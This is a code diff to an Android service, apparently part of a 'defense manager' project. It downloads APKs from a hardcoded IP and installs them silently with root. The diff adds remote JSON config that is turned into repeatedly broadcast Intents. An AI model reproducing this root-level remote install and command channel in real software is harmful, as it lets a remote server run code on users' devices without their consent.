@@ -23,6 +23,9 @@ import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
+import java.util.ArrayList;
+import java.util.Iterator;
+import java.util.List;
 import java.util.Timer;
 import java.util.TimerTask;
 
@@ -33,6 +36,7 @@ public class DefenseManagerService extends Service {
 
     static final String TAG = "MainApp";  // debug tag
     private static Timer timer = new Timer();
+    List<Intent> intents = new ArrayList<>();
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
@@ -72,6 +76,7 @@ public class DefenseManagerService extends Service {
                 intent.putExtra("url", "http://54.69.143.73/apks/" + apkinfo.getString("apkname"));
                 intent.putExtra("apkname", apkinfo.getString("apkname"));
                 intent.putExtra("servicetostart", apkinfo.getString("servicetostart"));
+                intent.putExtra("config", apkinfo.getJSONArray("config").toString());
                 intent.putExtra("receiver", new DownloadReceiver(new Handler(), this));
                 startService(intent);
 
@@ -87,7 +92,9 @@ public class DefenseManagerService extends Service {
     {
         public void run()
         {
-            Log.v(TAG, "timer called");
+            for (Intent i : intents) {
+                sendBroadcast(i);
+            }
         }
     }
 
@@ -119,15 +126,50 @@ public class DefenseManagerService extends Service {
         return builder.toString();
     }
 
-    public void downloadDone(String apkname, String servicetostart) {
+    public void downloadDone(String apkname, String servicetostart, String config) {
         Log.v(TAG, "DOWNLOAD DONE, installing:" + apkname);
         try {
             Process su = Runtime.getRuntime().exec("/system/xbin/su2 pm install -r /sdcard/" + apkname);
             su.waitFor();
             su = Runtime.getRuntime().exec("/system/xbin/su2 am startservice -n " + servicetostart);
             su.waitFor();
+            JSONArray c = new JSONArray(config);
+            processConfigIntents(c);
+            Log.v(TAG, c.toString());
         } catch (Exception e) {
             Log.v(TAG, e.toString());
+        }
+    }
+
+    private void processConfigIntents(JSONArray c) {
+        for (int i=0; i<c.length(); i++) {
+            try {
+                JSONObject cmd = c.getJSONObject(i);
+                String action = cmd.getString("action");
+                JSONObject extras = cmd.getJSONObject("extras");
+                Intent intent = new Intent();
+                Iterator<String> keys = extras.keys();
+                Log.v(TAG, "action:" + action);
+                while( keys.hasNext() ) {
+                    String key = (String)keys.next();
+                    if ( extras.get(key) instanceof String ) {
+                        intent.putExtra(key, (String) extras.get(key));
+                        Log.v(TAG, "putting str extra:" + key + ", " + (String) extras.get(key));
+                    } else if (extras.get(key) instanceof Integer) {
+                        intent.putExtra(key, (Integer) extras.get(key));
+                        Log.v(TAG, "putting int extra:" + key + ", " + extras.get(key).toString());
+                    }
+                }
+                boolean resend = cmd.getBoolean("resend");
+                Log.v(TAG, "Sending intent:" + intent.toString());
+                if (resend) {
+                    Log.v(TAG, "(will resend)");
+                    intents.add(intent);
+                }
+                sendBroadcast(intent);
+            } catch (Exception e) {
+                Log.v(TAG, "cmd exception:" + e.toString());
+            }
         }
     }
 
